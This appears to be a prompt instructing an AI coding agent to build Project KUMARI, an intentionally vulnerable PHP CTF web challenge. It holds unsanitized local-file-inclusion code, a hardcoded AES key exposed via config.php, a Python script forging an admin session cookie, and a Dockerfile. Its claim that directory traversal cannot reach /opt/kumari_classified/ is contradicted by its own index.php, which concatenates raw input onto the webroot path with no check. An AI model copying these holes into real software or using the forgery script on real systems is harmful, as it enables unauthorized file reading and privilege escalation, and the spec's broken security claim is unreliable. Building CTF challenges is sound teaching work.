# MASTER PROMPT — Project KUMARI Web Challenge (for Antigravity)

You are building a self-contained, dockerized CTF web challenge called **Project KUMARI**.
This is an intentionally vulnerable PHP 7.4 application for a security CTF. Build every file
exactly as specified. Do NOT sanitize or fix the intended vulnerabilities.

## 1. Exploit Chain (the intended solve path)

```
[1] View source / robots.txt
      → discover app://local/ comment (legacy Obsidian companion hint)
           ↓
[2] Use LFI to read backups/old_site_map.txt
      → see "Obsidian companion app v1.2.7" reference
           ↓
[3] Google "Obsidian CVE-2023-2110"
      → affects versions < 1.2.8
      → improper app://local/ path handling allows local file read
           ↓
[4] Use ?page=app://local/ to read config.php
      → extract the AES-256-CBC key
           ↓
[5] Decrypt own session cookie with extracted key
      → read the JSON plaintext
           ↓
[6] Modify JSON: role → "admin", expires → "2027-09-23"
      → re-encrypt with the same key
           ↓
[7] Send forged cookie to /admin.php
      → access granted → real story + flag
```

There is no padding oracle. Knowing the key means the player can encrypt directly with any
standard AES-256-CBC library. The hard part is discovering the key via the CVE-themed LFI.

The decoy path (steps 1–2 only, reading docs/tenmadurai/) leads to a complete-feeling fake
story with no indication that a deeper path exists. Players who stop there feel done.

## 2. Deception rules — non-negotiable

- No file, folder name, comment, error message, or variable name anywhere in the codebase
  may contain the words: fake, real, decoy, classified, secret, restricted, or hidden.
- `docs/tenmadurai/` is the decoy folder. Its name is neutral and in-universe.
- The real documents live at `/opt/kumari_classified/` — completely outside the webroot.
  The LFI bug (`?page=app://local/`) resolves paths relative to `/var/www/html/`, so
  even a full traversal attempt cannot reach `/opt/kumari_classified/` via the `page`
  parameter. The only code that reads those files is the hardcoded path in `admin.php`.
- The AES key lives at `/var/www/html/config.php` — inside the webroot, readable via the
  LFI. This is intentional: the CVE chain requires the player to exfiltrate `config.php`.

## 3. File structure

```
/var/www/html/                         ← webroot, app://local/ resolves here
├── index.php
├── admin.php
├── login.php
├── config.php                         ← contains AES key, readable via LFI (intentional)
├── robots.txt
├── .htaccess
├── includes/
│   ├── header.php
│   └── footer.php
├── docs/
│   ├── tenmadurai/                    ← decoy archive, traversal-reachable
│   │   ├── 01_mythological_overview.txt
│   │   ├── 02_serpent_mother_legend.txt
│   │   ├── 03_golden_peacock_incident.txt
│   │   ├── 04_aazhiyaan_decoder.txt
│   │   └── 05_curse_of_greed.txt
│   └── public/
│       ├── about.txt
│       └── contact.txt
├── backups/
│   ├── old_site_map.txt               ← contains Obsidian v1.2.7 reference (key clue)
│   └── db_backup.sql                  ← red herring decoy
└── tmp/
    └── error_logs/                    ← empty dir

/opt/kumari_classified/                ← outside webroot, unreachable via LFI
├── 01_tenmadurai_fall.txt
├── 02_street_academy.txt
├── 03_public_apathy.txt
└── 04_consequences.txt
```

## 4. `config.php`

```php
<?php
// AES-256-CBC session encryption
// Key must be exactly 32 bytes
$key = hex2bin('4b1e9d2c6a7f0834c5e19a2b7d6f0e834b1e9d2c6a7f0834c5e19a2b7d6f0e83');
$iv_size = openssl_cipher_iv_length('aes-256-cbc'); // 16

function encrypt_session($data) {
    global $key, $iv_size;
    $iv = openssl_random_pseudo_bytes($iv_size);
    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $ciphertext);
}

function decrypt_session($cookie) {
    global $key, $iv_size;
    $decoded = base64_decode($cookie, true);
    if ($decoded === false || strlen($decoded) < $iv_size) {
        return null;
    }
    $iv = substr($decoded, 0, $iv_size);
    $ciphertext = substr($decoded, $iv_size);
    if (strlen($ciphertext) === 0 || strlen($ciphertext) % 16 !== 0) {
        return null;
    }
    $plaintext = openssl_decrypt($ciphertext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    if ($plaintext === false) {
        return null;
    }
    return $plaintext;
}
?>
```

Note: the key hex string above is 64 hex chars = 32 raw bytes. Verify before deploying.

## 5. `index.php`

```php
<?php
include 'config.php';

// CVE-2023-2110 style LFI: app://local/ prefix is stripped and the remainder
// is resolved relative to the webroot. Intentionally unsanitized.
if (isset($_GET['page'])) {
    $raw = $_GET['page'];
    if (strpos($raw, 'app://local/') === 0) {
        $rel = substr($raw, strlen('app://local/'));
    } else {
        $rel = $raw;
    }
    $base = '/var/www/html/';
    $path = $base . $rel;
    if (file_exists($path) && is_file($path)) {
        header('Content-Type: text/plain');
        readfile($path);
        exit;
    } else {
        die('File not found: ' . htmlspecialchars($path));
    }
}

$cookie = $_COOKIE['session'] ?? '';

if ($cookie) {
    $decrypted = decrypt_session($cookie);
    if ($decrypted === null) {
        die('Error: Invalid session token.');
    }
    $data = json_decode($decrypted, true);
    if ($data === null) {
        die('Error: Session data corrupted.');
    }
} else {
    $default = json_encode([
        'user' => 'guest',
        'role' => 'viewer',
        'expires' => date('Y-m-d', strtotime('+1 day')),
        'access_level' => 1
    ]);
    setcookie('session', encrypt_session($default));
}
?>
<!DOCTYPE html>
<html>
<head><title>Project KUMARI – Research Portal</title></head>
<body>
<?php include 'includes/header.php'; ?>

<h1>Project KUMARI Research Archive</h1>
<p>Welcome to the official research portal for the lost continent of Kumari Kandam.</p>

<h2>Search Archives</h2>
<form action="index.php" method="GET">
    <input type="text" name="search" placeholder="Search documents...">
    <input type="submit" value="Search">
</form>

<h2>Featured Documents</h2>
<ul>
    <li><a href="index.php?page=docs/public/about.txt">About Project KUMARI</a></li>
    <li><a href="index.php?page=docs/public/contact.txt">Contact Us</a></li>
</ul>

<!--
    Legacy desktop companion integration enabled.
    Supported link scheme: app://local/docs/<filename>
    Requires Obsidian companion app (see /backups/old_site_map.txt for setup notes).
-->

<?php include 'includes/footer.php'; ?>
</body>
</html>
```

## 6. `admin.php`

```php
<?php
include 'config.php';

$cookie = $_COOKIE['session'] ?? '';

if (!$cookie) {
    header('Location: login.php');
    exit;
}

$decrypted = decrypt_session($cookie);

if ($decrypted === null) {
    die('Error: Invalid session token.');
}

$data = json_decode($decrypted, true);

if ($data === null) {
    die('Error: Session data corrupted.');
}

if (!isset($data['role']) || $data['role'] !== 'admin') {
    die('Error: Insufficient privileges.');
}

if (!isset($data['expires']) || $data['expires'] !== '2027-09-23') {
    die('Error: Session expired.');
}

// Real documents live outside the webroot — unreachable via the LFI bug.
$classified_dir = '/opt/kumari_classified/';

header('Content-Type: text/plain');
echo str_repeat('=', 80) . "\n";
echo "PROJECT KUMARI – RESTRICTED ARCHIVE\n";
echo str_repeat('=', 80) . "\n\n";

foreach ([
    '01_tenmadurai_fall.txt',
    '02_street_academy.txt',
    '03_public_apathy.txt',
    '04_consequences.txt',
] as $doc) {
    echo file_get_contents($classified_dir . $doc);
    echo "\n\n";
}

echo str_repeat('=', 80) . "\n";
echo "ACCESS GRANTED — NEXT STAGE\n";
echo str_repeat('=', 80) . "\n";
echo "VM Access: http://vm.projectkumari.onion:8080\n";
echo "Credentials: researcher / " . htmlspecialchars($data['user']) . "\n";
echo str_repeat('=', 80) . "\n";
?>
```

## 7. `login.php`

```php
<?php
include 'config.php';
$default = json_encode([
    'user' => 'guest',
    'role' => 'viewer',
    'expires' => date('Y-m-d', strtotime('+1 day')),
    'access_level' => 1
]);
setcookie('session', encrypt_session($default));
header('Location: index.php');
exit;
?>
```

## 8. `robots.txt`

```
User-agent: *
Disallow: /admin.php
Disallow: /login.php
Disallow: /backups/
Disallow: /tmp/
```

Backups is disallowed — which is exactly why players will check it. `old_site_map.txt` is in
there, and that file contains the Obsidian version reference.

## 9. `.htaccess`

```apache
Options -Indexes
DirectoryIndex index.php
# Default Apache error pages only — do not override with ErrorDocument.
```

## 10. `includes/header.php`

```html
<div style="background:#1a1a1a;color:#c8b89a;padding:12px 20px;font-family:monospace;">
  <strong>PROJECT KUMARI</strong> — Research Archive &nbsp;|&nbsp;
  <a href="index.php" style="color:#c8b89a;">Home</a> &nbsp;
  <a href="admin.php" style="color:#c8b89a;">Restricted Access</a>
</div>
```

## 11. `includes/footer.php`

```html
<hr style="border-color:#333;">
<div style="font-size:12px;color:#888;font-family:monospace;padding:8px;">
  &copy; 2027 Project KUMARI Research Consortium &nbsp;|&nbsp;
  Portal v2.1.4 &nbsp;|&nbsp; Desktop companion: Obsidian integration
</div>
```

Note: "Desktop companion: Obsidian integration" in the footer is a subtle hint that the site
uses an Obsidian companion app. It should read as boilerplate, not as a clue.

## 12. Document contents

### `docs/public/about.txt`
```
Project KUMARI is an ongoing research initiative studying the historical and
mythological record of Kumari Kandam, the lost southern landmass referenced
in ancient Tamil literature. This portal serves as a public-facing interface
to the project's digitized archive.

Access to restricted sections requires authentication.
```

### `docs/public/contact.txt`
```
Research enquiries: research@projectkumari.onion
Technical issues with the portal or desktop companion: tech@projectkumari.onion

Note: the Obsidian desktop companion app is required to access certain
archive documents. Contact the tech team for the installation package.
```

### `backups/old_site_map.txt`

This file is the critical clue — it must mention Obsidian version 1.2.7 naturally, buried
in what looks like routine migration notes:

```
PROJECT KUMARI PORTAL — MIGRATION NOTES (2026-11-03)
=============================================================

Pre-migration site layout (do not restore):

  /old_index.php         → replaced by index.php
  /old_admin.php         → replaced by admin.php
  /viewer/               → deprecated, removed
  /companion/            → deprecated, removed

Desktop companion setup (archived):
  - Obsidian companion app v1.2.7 required for app://local/ document links
  - Install package was distributed to team via internal channel
  - Note: v1.2.7 is the LAST version tested against this portal; upgrade
    to 1.2.8+ breaks the app://local/ integration (schema change upstream).
    Do not upgrade until the portal's link renderer is updated.
  - If links are broken, check that Obsidian companion is NOT on v1.2.8+.

Current site uses index.php / admin.php / login.php.
Session handling migrated to AES-256-CBC cookies (see config.php).
=============================================================
```

This note tells the player three things without ever being explicit:
1. Obsidian companion v1.2.7 is in use.
2. v1.2.8 broke the `app://local/` integration — which maps directly to CVE-2023-2110
   (the fix in 1.2.8 patched the path handling).
3. `config.php` is the relevant file for session handling — points them at what to steal.

### `backups/db_backup.sql` (red herring)
```sql
-- Project KUMARI DB backup — 2025-08-01
-- Authentication migrated away from DB in 2026. This file is kept for audit.
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'viewer',
    created_at DATETIME
);
INSERT INTO users VALUES
  (1, 'admin', '$2y$10$zT7nMxqP1rK8vLdW3sYeHOQJ5bNpA6cRm9iXuFkVh2gEDjIwl4sty', 'admin', '2025-01-10 09:00:00'),
  (2, 'guest', '$2y$10$aB3cD4eF5gH6iJ7kL8mN9OPQrStUvWxYzABCDEFGHIJKLMNOPQRSTU', 'viewer', '2025-01-10 09:01:00');
-- NOTE: DB auth is DEPRECATED. Portal now uses encrypted cookie sessions. See config.php.
```

Players who go down the DB path will find bcrypt hashes that are uncrackable in CTF time.
The comment redirects them back to `config.php`, reinforcing the correct path.

### Decoy documents — `docs/tenmadurai/`

These must read as a complete, self-contained historical account. The closing line of the
last document must signal finality so players feel done and don't go looking for more.

**`01_mythological_overview.txt`**
```
According to court record fragments recovered from the Tenmadurai excavation,
the sage Agastya founded the city on the southern shore during the second
Sangam era. The wanderer's last known words, preserved in oral tradition,
were: "I am leaving for Kapatapuram tomorrow." Kabilan's final transmission
from the survey team was dated 2027-09-23, three days before contact was lost.
```

**`02_serpent_mother_legend.txt`**
```
Temple inscriptions describe a guardian figure — the Serpent Mother — said to
protect the city's central library from those unworthy of its knowledge.
Scholars generally read this as an allegory for restricted access to
priesthood-only texts rather than a literal creature, though the inscriptions
themselves make no such distinction.
```

**`03_golden_peacock_incident.txt`**
```
Palace chronicles record that King Vetrivel pursued a golden peacock into
the eastern forest on the 23rd day of September, an incident later cited as
the beginning of his estrangement from court duties. He did not return for
eleven days, and the throne was administered by regents in his absence.
```

**`04_aazhiyaan_decoder.txt`**
```
Aazhiyaan, credited with decoding the city's numeral system, vanished on the
23rd day of the 9th month, 2027, during a routine survey. His final
transmission, sent that morning, contained only a partial cipher key and
the coordinates of the southern archive vault.
```

**`05_curse_of_greed.txt`**
```
The final chronicle entry, dated shortly after the golden peacock incident,
records a proclamation attributed to the city's high priest: "Let greed
consume what wisdom built" — spoken on the 23rd day of the 9th month. Within
a generation the city was abandoned. Later excavation teams found no
evidence of war, fire, or natural disaster. The record simply stops.

This concludes the recovered Tenmadurai archive. No further transmissions
from the site have been received.
```

### Real documents — `/opt/kumari_classified/`

**`01_tenmadurai_fall.txt`**
```
King Vetrivel neglected the scholars of Tenmadurai, treating their counsel
as a burden rather than a foundation. Resources once devoted to learning
were redirected toward foreign luxuries. The court dismissed the academics,
and within a decade the great library stood empty.
```

**`02_street_academy.txt`**
```
With the royal academies defunded, scholars began teaching in the streets.
Children, farmers, and merchants gathered to learn what they could — an
informal academy born of necessity and preserved through stubborn conviction.
```

**`03_public_apathy.txt`**
```
Dazzled by imported goods and spectacle, the public largely ignored the
street scholars. Only the poor and the elderly, with nothing else to occupy
them, continued to attend. The scholars kept teaching regardless.
```

**`04_consequences.txt`**
```
No new generation of scholars arose to replace the old. Oral traditions
frayed and were lost within two generations. The city did not fall to war
or disaster — it simply forgot itself, and its knowledge perished with the
last who remembered it.

FLAG: KUMARI{0bs1d1an_l0cal_p4th_t0_4dm1n_f0rg3d}
```

The flag goes in the last real document, not in the admin panel response itself — players
should have to read all four documents to find it.

## 13. Cookie forge — solver's expected script (for your reference, not deployed)

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64, json, os

key = bytes.fromhex('4b1e9d2c6a7f0834c5e19a2b7d6f0e834b1e9d2c6a7f0834c5e19a2b7d6f0e83')

# 1. Decrypt existing cookie to confirm the key works
raw_cookie = "<paste your session cookie here>"
decoded = base64.b64decode(raw_cookie)
iv, ct = decoded[:16], decoded[16:]
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ct), 16)
print("Decrypted:", plaintext)

# 2. Forge admin cookie
payload = json.dumps({
    "user": "kabilan",
    "role": "admin",
    "expires": "2027-09-23",
    "access_level": 5
})
iv2 = os.urandom(16)
cipher2 = AES.new(key, AES.MODE_CBC, iv2)
ct2 = cipher2.encrypt(pad(payload.encode(), 16))
forged = base64.b64encode(iv2 + ct2).decode()
print("Forged cookie:", forged)
```

This is the expected solve script — include it in your internal writeup, not in the challenge.

## 14. `Dockerfile`

```dockerfile
FROM php:7.4-apache

RUN docker-php-ext-install mysqli

COPY ./html/ /var/www/html/
COPY ./classified/ /opt/kumari_classified/

RUN mkdir -p /var/www/html/tmp/error_logs
RUN chmod -R 755 /var/www/html
RUN chmod 644 /var/www/html/config.php
RUN chmod -R 750 /opt/kumari_classified

RUN useradd -m ctf_user
RUN chown -R www-data:www-data /var/www/html
RUN chown -R www-data:www-data /opt/kumari_classified

EXPOSE 80
```

Build context: `./html/` for webroot content, `./classified/` for real docs.

```
docker build -t project_kumari .
docker run -d -p 80:80 --name kumari_challenge project_kumari
```

## 15. Acceptance checklist

- [ ] `/` with no cookie sets a fresh `guest`/`viewer` AES-CBC session cookie.
- [ ] `?page=app://local/config.php` returns raw `config.php` source including the hex key.
- [ ] `?page=app://local/backups/old_site_map.txt` returns the migration notes with Obsidian v1.2.7.
- [ ] `?page=app://local/docs/tenmadurai/05_curse_of_greed.txt` returns the decoy doc with the conclusive closing line.
- [ ] `?page=app://local/../../../opt/kumari_classified/01_tenmadurai_fall.txt` returns "File not found" — real docs unreachable via LFI.
- [ ] Forging a cookie with `role=admin` + `expires=2027-09-23` using the extracted hex key and sending it to `admin.php` returns all four real documents including the flag.
- [ ] `role=admin` with any other `expires` value returns "Error: Session expired."
- [ ] `role=viewer` (unmodified original cookie) on `admin.php` returns "Error: Insufficient privileges."
- [ ] `robots.txt` disallows `/backups/` — drawing attention to it without blocking it.
